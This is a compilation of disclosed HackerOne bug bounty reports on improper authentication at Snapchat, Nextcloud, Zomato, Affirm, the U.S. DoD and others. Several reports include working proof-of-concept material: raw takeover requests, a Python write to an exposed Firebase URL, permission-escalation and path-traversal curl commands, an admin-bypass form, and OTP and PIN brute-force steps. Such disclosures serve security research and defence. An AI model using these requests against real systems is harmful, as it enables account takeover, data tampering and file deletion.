Thank you very much to @alexseville and team for the kind triage, kudos for applying a preliminary fix on the day of reporting! :)

If you have any comments or questions, feel free to reach out via Twitter: https://twitter.com/_lauritz_

---

### [hardcoded api secret & api key in com.reddit.frontpage](https://hackerone.com/reports/1241116)

- **Report ID:** `1241116`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Reddit
- **Reporter:** @0xcharan
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T19:47:40.687Z
- **CVE(s):** -

**Vulnerability Information:**

hi security team,
in file Resources/Resources.arsc/res/values/strings.xml
i have found
<string name="twitter_consumer_key">███</string>
<string name="twitter_consumer_secret">███</string>

It shouldn't be disclosed to third parties it meant for deveoplers as per https://developer.twitter.com/en/docs/authentication/oauth-2-0/bearer-tokens

poc:-
curl --user "██████:███"  --data 'grant_type=client_credentials' 'https://api.twitter.
com/oauth2/token'

response:-
{"token_type":"bearer","access_token":"████"}

it meant to request successful as official docs say https://developer.twitter.com/en/docs/authentication/oauth-2-0/bearer-tokens

## Impact

leakage of twitter_consumer_key and twitter_consumer_secret to public it meant for deveoplers only

---

### [Improper Validation at Partners Login](https://hackerone.com/reports/990048)

- **Report ID:** `990048`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Eternal
- **Reporter:** @ashoka_rao
- **Bounty:** 2000 usd
- **Disclosed:** 2021-10-06T08:25:49.849Z
- **CVE(s):** -

**Summary (team):**

## Timeline 

| Timeline | Action |
|---|---|
| Thu, 24 Sep 2020, 12:10 IST | Researcher submitted the report on H1 with initial severity as High. |
| Thu, 24 Sep 2020, 12:32 IST | First response - we asked for clarification via demonstration on attack scenarios. Parallelly, we began our own investigation. |
| Thu, 24 Sep 2020, 14:44 IST | Researcher provided additional clarification as requested earlier. |
| Thu, 24 Sep 2020, 21:59 IST | Security Team analyzed the scenarios and realized the attack scenarios were not as significant as claimed. We requested additional information to substantiate the scenarios. |
| Thu, 24 Sep 2020, 23:49 IST | Security Team was able to identify the issue independently, based on the preliminary information provided by the researcher. |
| Thu, 24 Sep 2020, 23:51 IST | Researcher shared additional context with new attack scenarios |
| Thu, 24 Sep 2020, 23:54 IST | SSeverity upgraded from High to Critical (9.8 CVSS) by the Security Team, as per the additional attack scenarios shared by the researcher. |
| Thu, 24 Sep 2020, 23:54 IST | Security Team was able to reproduce the issue. Report Triaged. |
| Thu, 24 Sep 2020, 23:56 IST | Security Team started an investigation to observe abuse caused by the vulnerability |
| Fri, 25 Sep 2020, 00:01 IST | Merchant Team proposed solution. |
| Fri, 25 Sep 2020, 00:10 IST | Patch raised for review. |
| Fri, 25 Sep 2020, 00:18 IST | Security Team confirmed the entities used in the demonstration by the researcher. |
| Fri, 25 Sep 2020, 00:26 IST | Researcher confirmed the entitled used in the demonstration. |
| Fri, 25 Sep 2020, 00:27 IST | Fix Deployed on internal systems for testing. |
| Fri, 25 Sep 2020, 00:30 IST | Security Team confirmed vulnerability was not abused and did not impact any customer. More detailed investigation and log analysis of past events were carried out. |
| Fri, 25 Sep 2020, 00:38 IST | Fix verified by Security Team. |
| Fri, 25 Sep 2020, 00:45 IST | Fix merged in the codebase. |
| Fri, 25 Sep 2020, 09:30 IST | Initial investigation confirmed no abuse against the issue reported. |
| Fri, 25 Sep 2020, 10:00 IST | Panel decided and finalized on the bounty. |
| Fri, 25 Sep 2020, 10:14 IST | Bounty awarded. |
| Fri, 25 Sep 2020, 10:30 IST | Fix rolled out. |
| Fri, 25 Sep 2020, 10:35 IST | Merchant team began monitoring changes and continued to search for more issues. |
| Fri, 25 Sep 2020, 12:14 IST | Additional investigation implemented to look for similar issues in our system. |
| Fri, 25 Sep 2020, 18:35 IST | Merchant team confirmed the presence of no abuse due to the highlighted issue in the past events. |
| Fri, 26 Sep 2020, 21:08 IST | Security Team reached out to the researcher to confirm the fix. |
| Fri, 26 Sep 2020, 21:20 IST | Researcher confirmed the fix. |
| Tue, 29 Sep 2020, 21:20 IST | Security Team shared the resolution report status timeline. |
| Wed, 30 Sep 2020, 15:20 IST | All investigations completed, no cases of vulnerability abuse found, and no customer was impacted.  |
| Fri, 02 Oct 2020, 15:20 IST | Resolution timeline changed - we decided to keep the report open while the team looks for more similar scenarios in related systems. |
| Sat, 10 Oct 2020, 15:20 IST | Resolution timeline finalized by the panel. |
| Mon, 12 Oct 2020, 09:30 IST | Report marked as resolved. |
| Mon, 12 Oct 2020, 10:48 IST | Researcher requested disclosure of the report. |
| Mon, 15 Oct 2020, 10:48 IST | Report moved to disclosure queue for decision. |
---------------------------------------------------------------

## Summary 

The following request was vulnerable:

```http
POST /merchant-api/dining/merchant-login/v1/send-otp HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-zomato-csrft: CSRF
x-zomato-app-version: 2
services-access-token:
Content-Length: 79
Origin: https://www.zomato.com
Connection: close
Referer: https://www.zomato.com/partners
Cookie: XXXXXXX

{"res_id":"XXXXXXXX","country_isd":"918888888888,","phone_number":"XXXXXXXXXX"}
```

There were no strict checks on `country_isd`. Our backend generated the OTP for `phone_number` param but appended the `country_isd` parameter to the `phone_number` param before sending the SMS without any major checks. Our SMS provider supports multiple phone numbers separated by spaces. After appending the phone number will become: `918888888888,XXXXXXXXXX` where 8888888888 is the attacker's number and `phone_number` is the victim's phone number. 

Here the reporter was able to demonstrate an attack to get the OTP of the victim on both the attacker's number and the victim's number.

---

### [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780)

- **Report ID:** `921780`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Snapchat
- **Reporter:** @korniltsev
- **Bounty:** - usd
- **Disclosed:** 2021-09-03T09:12:24.380Z
- **CVE(s):** -

**Vulnerability Information:**

'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.

I will demonstrate the problem on two accounts.
Victim: ███
Attacker: ██████████


-  Attacker perform a usuall login to attacker's personal account.
-  Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id
request

```
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

 response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:39:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding
x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
server: API Gateway
cache-control: no-cache, no-store
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snapchat-request-id: █████
x-snapchat-server-latency: 342
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 137

{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
```
Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

-  Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

```
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:40:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding,Accept-Encoding
x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
server: API Gateway
cache-control: no-cache, no-store
x-snap-refresh-token: ████
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snap-access-tokens: ███
x-snapchat-request-id: ████████
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 138867

{"updates_response":{"logged":true,"username":"█████","user_id":"█████",...
```
An attacker successfully performed login as victim.

Victim's user_id can be easily obtained with friends request.

I've attached the following:
- a screencast to showcase the problem.
- burp project ████
- logout+login raw requests exported from burp
- a python script to perform the attack

I've tested this bug only on my personal accounts.
███████
███
█████████

## Impact

An attacker is able to  login as any user.

**Summary (team):**

This vulnerability was discovered on the One Tap Password (OTP) login/logout flow. If exploited, the attacker could log in to any account for which they had the user_id. This id is exposed in several places and should not have been trusted in the request by the logout endpoint.

---

### [PIN bypass](https://hackerone.com/reports/1242212)

- **Report ID:** `1242212`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** MyEtherWallet
- **Reporter:** @tushar_rec0n
- **Bounty:** - usd
- **Disclosed:** 2021-06-29T20:19:24.430Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

MEW apk has improper rate limit.


When we try to brute force the PIN, we are rate limited for 5 minutes after 5 or 6 attempt.


In my testing I found that it was checking the device's local time so by changing it we can brute force the PIN.


## Steps To Reproduce:

1.Install MEW app from play store.

2.Create your PIN.

3.Now open again your MEW apk.

4.You will be asked to enter the PIN.

5.Try to brute force the code. You will see a message to try again after 5 min.

6.Now change the time of your device.

7.Observe there is no rate limit now.

## Supporting Material/References:


{F1350023}

## Impact

An attacker can brute force the PIN of an user

---

### [Firebase Database Takeover in Zego Sense Android app](https://hackerone.com/reports/1065134)

- **Report ID:** `1065134`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Zego
- **Reporter:** @sheikhrishad0
- **Bounty:** - usd
- **Disclosed:** 2021-06-23T16:04:36.189Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,

Summary:
publicly available Firebase Database (api-project-615509201590.firebaseio.com)

Platform Affected: [android]
com.zegocover.zego

Steps To Reproduce:

in res/values/strings.xml

    <string name="firebase_database_url">https://api-project-615509201590.firebaseio.com</string>

POC:

    Go to https://api-project-615509201590.firebaseio.com/.json

{F1127099}

Exploit:

    import requests
    data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
    reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)


References:


There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

Regards,
Sheikh Rishad

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.

So please immediately change the rule of the database to private so that nobody can able to access it outside.

---

### [Attacker can obtain write access to any federated share/public link](https://hackerone.com/reports/1170024)

- **Report ID:** `1170024`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Nextcloud
- **Reporter:** @rtod
- **Bounty:** 4000 usd
- **Disclosed:** 2021-06-10T13:41:19.545Z
- **CVE(s):** CVE-2021-32654

**Vulnerability Information:**

Hi mates,

I stumbled across this with public links. But the same holds true for any federated share. I will try to describe the link scenario.
At first I thought there were more steps (and resharing was involved). But it really is very simples:

1. An attacker obtains a public link (again plenty of those around). For the sake of the attack it is a read only public link
2. The attacker uses the 'add to my nextcloud' functionality to have a federated share created to their own instance
3. The attacker accepts this share
4. Now the attacker checks their database and finds the entry in the `oc_share_external` table.

We are looking for really only the remote id. And the token.
For the sake of this example the `remote id = 2` and the `token = nOxdNJkb1xbI1VX`

5. Now we craft our request

```
curl -v -X POST http://localhost/index.php/ocm/notifications -d '{"notificationType":"RESHARE_CHANGE_PERMISSION","resourceType":"file","providerId":2,"notification":{"sharedSecret":"nOxdNJkb1xbI1VX","permission":["read","write","share"]}}' -H 'Content-type: application/json'
```

To break this down.
We send an (anonymous) POST request to the victims server to be precise to index.php/ocm/notifications
And we pass it the following json

```json
{
   "notificationType":"RESHARE_CHANGE_PERMISSION",
   "resourceType":"file",
   "providerId":2,
   "notification":{
      "sharedSecret":"nOxdNJkb1xbI1VX",
      "permission":[
         "read",
         "write",
         "share"
      ]
   }
}
```

6. The attacker now enjoys their federated share with READ+WRITE+UPDATE+CREATE+SHARE access. (I think it is probably even a bug that there is no way to grant DELETE).


Since we create a federated share at step 1. This also holds true for any created federated share.

## Impact

In short if an attacker has a public link. Or a federated share with them they can elevate their permissions very easily.

This allows them to overwrite files. Add new files. And so on. In short the integrity of all files in public links and federated shares should be considered compromised.

Pardon my directness. But you really should take a serious look at your federation code. As it seems to miss checks all over the place. Maybe recommending everybody to disable it for now is the best course of action.

---

### [Administration Authentication Bypass on https://█████](https://hackerone.com/reports/1146600)

- **Report ID:** `1146600`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fiveguyslover
- **Bounty:** - usd
- **Disclosed:** 2021-04-20T19:34:47.351Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there
I found a way to connect to an administration space on your website https://██████████

#how to reproduce ?

1) - go to this link : https://███/██████████
2) - create a html file with : 
```html
<form action="https://████████/██████████" method="post">
    <input type="hidden" name="█████" value="">
    <input type="hidden" name="█████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://███████/█████
4) - refresh the page and you have access to the administration

POC : 

██████████

if you need more information, contact me

best regards,
fiveguyslover

## Impact

access to sensitive data and the ability to modify information.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1) - go to this link : https://█████/███████
2) - create a html file with : 
```html
<form action="https://█████/███" method="post">
    <input type="hidden" name="███" value="">
    <input type="hidden" name="████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://██████/█████
4) - refresh the page and you have access to the administration

## Suggested Mitigation/Remediation Actions

---

### [Ability to DOS any organization's SSO and open up the door to account takeovers](https://hackerone.com/reports/976603)

- **Report ID:** `976603`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @cache-money
- **Bounty:** 10500 usd
- **Disclosed:** 2021-04-15T17:00:41.212Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click "join", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization.

The strange behavior and why I think it *might* be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way.

The bug stems from the fact that you can create an `entityId` identical to that of another organization **except** with a space ` ` at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the application attempts to log them into the attacker's organization. The result of this is a DOS since legitimate users can no longer access their organization. The interesting part of the bug is that if the user is deleted from their original organization (or a **new** user attempts to SSO), they will then be authenticating against their original organization, but get added into the attacker's organization. So it seems the SAML Response is checked against a `trim(issuer)`, but when trying to place the user into an organization, the entity with the space is always prioritized.

The steps below will demonstrate this behavior:

## Steps To Reproduce:
1. Setup SSO and confirm you can login.
2. Create a **new** Grammarly business account and use the same `entityId` (Identity Provider Issuer) you used in step 1, except add a space to the end of it. Use a different keypair for this organization as well.
3. Wait 2 minutes for the change to propagate, then try logging into the same account from step 1, and notice you now get an error.
4. At this point the victim organization is DOS'd. To confirm the strange behavior discussed above, you can delete that user from the victim organization and attempt to login again. Notice you will now end up getting provisioned to the attacker's organization, even though you signed the SAML Response with the victim organization's private key.
5. Once you are provisioned into the attacker's organization, the attacker can then change their `entityId` to something brand new, and login to the victim's account using the keypair they own. If this was a converted personal account, you can then access that user's personal documents.

## Impact

- Ability to effectively disable SSO for any organization.
- Ability to get users provisioned into an attacker's account, which they can then takeover.

Thanks,
-- Tanner

**Summary (team):**

The vulnerability was fixed before SSO became available to Grammarly customers.

---

### [Administrative access to development deployment of web service due to auto-filled credentials](https://hackerone.com/reports/923022)

- **Report ID:** `923022`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Acronis
- **Reporter:** @stealthy
- **Bounty:** 250 usd
- **Disclosed:** 2021-02-16T13:19:25.700Z
- **CVE(s):** -

**Summary (team):**

It was possible to gain administrative permissions on https://admin.acronis.host due to auto-filled credentials. The service was used for development purposes only and did not contain any sensitive data or data of real users.

**Summary (researcher):**

**Summary:**
I discovered an Acronis admin panel which auto filled credentials. This allowed me to gain access multiples databases and get an authentication token for the internal API.

```test
Username:admin@test.com
Password:password
```

I was able to discover an SQL injection and authenticate myself on `dev.acronis.host` (which is the internal API).
Example request:
```text
GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search= HTTP/1.1
Host: dev.acronis.host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer {token}
Origin: https://admin.acronis.host
Connection: close
Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372
```

Further analysis concluded that data was development and no real users were affected. Acronis is a great team and I look forward to working with them in the future.

---

### [Misconfiguration of Merchant id in jwt header + Weird Debug mode enabling behavior leads to exposed OTP of mobile number.](https://hackerone.com/reports/1080901)

- **Report ID:** `1080901`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Kartpay
- **Reporter:** @basant0x01
- **Bounty:** - usd
- **Disclosed:** 2021-01-20T12:16:49.273Z
- **CVE(s):** -

**Summary (team):**

The Verification email Content was able to decrypt easily and leads to disclosure of information that was supposed to be provided after account verification is completed. Secondly, For a Limited time Production was put on debug mode but it was left with it. so now it has been fixed.

---

### [Authentication bypass and RCE on the https://████ due to exposed Cisco TelePresence SX80 with default credentials](https://hackerone.com/reports/684070)

- **Report ID:** `684070`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:55:36.855Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I was able to identify Cisco TelePresence SX80 device located on the https://█████
According to the IP Info: https://ipinfo.io/████████it belongs to ASN with ID 
```
███████
```
so it's likely in scope of the program.
The mentioned instance has default credentials `████`

##POC
https://███████
Login with `█████████`
████
Since we are logged in as ███, we can completely control the device and all connections, and add our startup scripts via https://██████████/web/scripts

##Suggested fix
Change the credentials and likely you will need to reset the device

## Impact

Potential device compromise and code execution. This devices are used mainly for trainings, briefings, and demonstration rooms, as well as auditoriums, so attacker with full control of the device potentially can intercept the data (RCE potential is interesting, but ability to silently compromise the device and use it as backdoor can be much more harmful).

---

### [Able to authenticate as administrator by navigating to https://█████/admin/](https://hackerone.com/reports/1035742)

- **Report ID:** `1035742`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:35:13.552Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The endpoint at https://███████/admin/ authenticates the user  to the administrator user.

## Step-by-step Reproduction Instructions

1. Navigate to https://███/ and youll notice you will need to log in.
2. Navigating to https://██████████/admin/ will show you admin malformed page, with the ability to "log out"

As for now as we can see by the picture no data is present at the administrator panel, sure this might change at the future exposing sensitive ifnormation

████████


## Suggested Mitigation/Remediation Actions

Issuing 403 response when trying to access the /admin endpoint.

##Best regards
nagli

## Impact

Admin authentication bypass

---

### [Bypass Password Authentication to Update the Password](https://hackerone.com/reports/970157)

- **Report ID:** `970157`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** X / xAI
- **Reporter:** @a13h1
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T18:42:17.336Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's Password, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)

This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password) 

**Description:** For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's password by bypassing the old password by the umrestricted rate limit or bruteforcing in the password

## Steps To Reproduce:

With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.

  Security Vulnerability #1 - Update Victim's Password - Bypass old password by unrestricted rate limiting


1.Go to Settings and Privacy -> Accounts
2.Click on Email -> Password
3.Enter any random password and Click on 'Next'
4.Intercept the request the above request and send it to intruder
5.Then select the position old password
6.Then go in payload add password list 
7.Then start the attack bcoz of no rate limit the password bruteforcing is continue and find the correct password and update the old one

**Resolution:** Apply the Rate Limitation 



## Supporting Material/References:

## Impact

This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password and it use to fully takeover the victim password

---

### [Unsecured Grafana instance on https://monitoring.prow-canary.k8s.io/dashboards](https://hackerone.com/reports/1000922)

- **Report ID:** `1000922`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Kubernetes
- **Reporter:** @zevfw5pp
- **Bounty:** - usd
- **Disclosed:** 2021-01-07T18:32:43.812Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
I was looking at  https://monitoring.prow-canary.k8s.io Grafana webapp. I'm not sure if it is for demo purposes, but I can access the main dashboard and view all graphs. 
`https://monitoring.prow-canary.k8s.io/dashboards`

If indeed it is for demo purposes, please let me close the report myself.
looking forward to hearing from you
Thank you

## Impact

access charts on various server resource usage.

---

### [Absence of Token expiry leads to Unauthorized login Access](https://hackerone.com/reports/766578)

- **Report ID:** `766578`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Affirm
- **Reporter:** @yogesh_ojha
- **Bounty:** - usd
- **Disclosed:** 2020-12-01T00:09:45.558Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
While doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.

The way affirm mobile login works is that,

User inputs the phone number
It then makes a call to an API endpoint /api/v3/login/phone/
```
POST /api/v3/login/phone/ HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 40
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-User-Agent: Affirm-Android

{"channel":"sms","address":"7022170000"}
```

This endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.
The response looks something similar to this

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 11:53:27 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: XXX=
Affirm-Client: XXXX-
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c
Strict-Transport-Security: max-age=86400
Content-Length: 299

{"response_url": "/api/v3/login/phone/SOMETOKEN"}
```

Another call to the api is made to the URL obtained from the above response_url This API request looks like this

```
POST /api/v3/login/phone/SOMETOKEN HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 19
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22

{"response":"0000"}
```

Since SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.
Once the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.
Like this,
{F672314}

The response will be

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 12:30:58 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca
Strict-Transport-Security: max-age=86400
Content-Length: 109

{"status": "authenticated", "token": null, "user_id": "1479-5770-XGGL", "expiration": "3019-12-31T17:17:38Z"}
```

This response contains Affirm-Client which is like a session ID, later used to make a request.

To verify if this is the actual session ID or not, this can be done by making a request to the api

```
GET /api/v2/users/1479-5770-XGGL HTTP/1.1
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22
```

The user ID can also be obtained from the above response.

If the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.

```
{"phone_number": {"phone_number": "+1-702-217-0000", "user_id": "1479-5770-XGGL", "id": "CNAIG0U1BMPHN5BK"}, "status": "ACTIVE", "name": {"last": "NEPAK", "full": "TESTING NEPAK", "user_id": "1479-5770-XGGL", "id": "4ZBC33TYEY12SOWP", "first": "TESTING"}, "is_personalized_services_active": true, "created": "2019-12-31T10:48:00Z", "dob": "1980-06-23", "id": "1479-5770-XGGL", "address_confirmation_status": "not confirmed", "address": {"city": "San Francisco", "user_id": "1479-5770-XGGL", "is_po_box": false, "street1": "325 Pacific Ave", "region1_code": "CA", "is_military_address": false, "postal_code": "94111", "country_code": "USA", "id": "G2YM6ESBLH36ETLZ"}, "user_consented_to_lto": null, "email": {"verified": false, "user_id": "1479-5770-XGGL", "email": "who_has_no_name+0000@wearehackerone.com", "id": "B9SUH5XOB1559Q8J"}}
```
{F672319}

### Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.

Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.

Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.

POC Video
{F672564}
-Happy New year team Affirm <3

## Impact

Unauthorized account access, Account takeover

---

### [https://██████ vulnerable to CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD](https://hackerone.com/reports/1031437)

- **Report ID:** `1031437`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @themastersunil
- **Bounty:** - usd
- **Disclosed:** 2020-11-23T17:58:49.254Z
- **CVE(s):** CVE-2020-3187

**Vulnerability Information:**

Hi @U.S. Dept Of Defense, I found a host <https://██████> which is running on the web services interface of Cisco ASA/FTD and it is vulnerable to CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences. An exploit could allow the attacker to view or delete arbitrary files on the targeted system. When the device is reloaded after the exploitation of this vulnerability, any files that were deleted are restored. The attacker can only view and delete files within the web services file system.

**Proof of Concept:**

Now we know that in CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD. This allow the attacker to view or delete arbitrary files on the targeted system
In this we can delete the files. For example the logo file present on the server at <https://████████/+CSCOU+/csco_logo.gif> can be deleted by the following steps.

This can be done by sending a curl request as : curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" <https://███/+CSCOE+/session_password.html>

